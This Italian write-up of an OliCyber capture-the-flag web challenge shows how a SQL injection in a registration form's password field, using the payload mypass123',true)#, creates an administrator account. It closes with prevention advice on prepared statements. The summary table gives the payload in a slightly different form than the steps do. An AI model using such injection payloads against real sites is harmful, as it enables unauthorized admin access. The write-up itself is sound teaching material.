# Admin's Secret

**Competizione:** OliCyber<br>
**Categoria:** Web<br>
**URL:** http://adminsecret.challs.olicyber.it

---

## Descrizione

> Ho trovato questo sito in cui ci si può registrare, ma solo l'amministratore riceve le informazioni più interessanti. Riesci ad intrufolarti?

Un sito con login e registrazione. L'obiettivo è registrarsi come amministratore per ottenere la flag.

---

## Soluzione

### Step 1 — Analisi del codice

La query di registrazione è:
```php
$sql = "INSERT INTO users(username,password,admin) VALUES ('" . $username . "','" . $password . "',false);";
```

Tradotta:
```sql
INSERT INTO users(username,password,admin) VALUES ('username', 'password', false);
```

**Vulnerabilità:** La variabile `$password` viene concatenata direttamente senza sanitizzazione! **SQL INJECTION nel campo PASSWORD!**

---

### Step 2 — Identificazione della vulnerabilità

Il campo `admin` è un booleano impostato a `false`. Possiamo iniettare SQL nel campo password per modificarlo a `true`.

---

### Step 3 — Craft the SQL Injection payload

Nel campo **PASSWORD** (non username!), inseriamo:
```
mypass123',true)#
```

Questo trasforma la query in:
```sql
INSERT INTO users(username,password,admin) VALUES ('username1230x','mypass123',true)#',false);
```

**Spiegazione:**
- `mypass123',true)` - Chiude la query e imposta `admin = true`
- `#` - Commento SQL (MySQL/MariaDB) che elimina il resto della query

**Nota:** Usiamo `#` anziché `--` perché in MariaDB il `--` seguito da una virgola causa errori di sintassi.

---

### Step 4 — Eseguire l'exploit

1. Visitare `http://adminsecret.challs.olicyber.it/register.php`
2. Nel campo **Username** inserire un username qualsiasi:
   ```
   admin
   ```
3. Nel campo **Password** inserire il payload:
   ```
   mypass123',true)#
   ```
4. Cliccare **Registrati**

Il sistema registrerà un utente admin!

---

### Step 5 — Login come admin

Ora fai login con:
1. Visitare `http://adminsecret.challs.olicyber.it/login.php`
2. **Username:** `admin`
3. **Password:** `mypass123`
4. Cliccare **Login**

Vedrai la flag in un **alert blu**.

---

### Step 6 — Script di exploit automatico

Vedi [exploit.py](exploit.py) per lo script completo.

```bash
python3 exploit.py
```

---

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | SQL Injection (SQLi) nel campo password della registrazione |
| **Causa** | Concatenazione diretta di variabili nella query SQL senza sanitizzazione |
| **Vettore** | Iniettare `mypass123',true);#` nel campo password |
| **Impatto** | Creazione di un account admin e accesso non autorizzato |

---

### Perché funziona

La query originale:
```sql
INSERT INTO users(username,password,admin) VALUES ('USERNAME','PASSWORD',false);
```

Con il payload nel campo password `mypass123',true)#`:
```sql
INSERT INTO users(username,password,admin) VALUES ('username1230x','mypass123',true)#',false);
```

Il `#` commenta il resto della query, quindi:
- Crea un utente con il username che scegli
- Imposta la password come `mypass123`
- Imposta `admin = true` (è un amministratore)
- Ignora il resto della query originale

**Nota importante:**
- L'iniezione va nel campo password, non nel username!
- Usiamo `#` anziché `--` perché in MariaDB il `--` non funziona bene quando seguito da una virgola

---

## Conclusioni

Questa challenge dimostra che:

1. **SQL Injection è ancora critica**: Concatenare variabili in SQL è pericolosissimo
2. **Tutti i campi sono potenziali vettori**: Non è solo il login, anche la registrazione!
3. **Prepared Statements salvano**: Sono la soluzione standard per prevenire SQLi
4. **Accesso admin è il bersaglio**: Chi controlla l'admin controlla tutto